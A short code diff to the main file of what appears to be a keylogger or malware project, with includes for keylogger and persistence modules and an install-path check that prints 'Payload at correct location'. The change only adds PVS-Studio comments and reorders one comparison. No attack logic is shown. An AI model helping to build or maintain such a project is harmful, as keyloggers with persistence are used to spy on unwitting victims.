@@ -1,3 +1,5 @@
+// This is an open source non-commercial project. Dear PVS-Studio, please check it.
+// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
 #include "globals.hpp"
 #include "keylogger.hpp"
 #include "persistence.hpp"
@@ -47,7 +49,7 @@ int main()
 
 	//pre communication install correctness checks
 	const auto installPath = GetInstallPath();
-	if (installPath == expectedInstallPath)
+	if (expectedInstallPath == installPath)
 	{
 	printf("Payload at correct location\n");
 	}
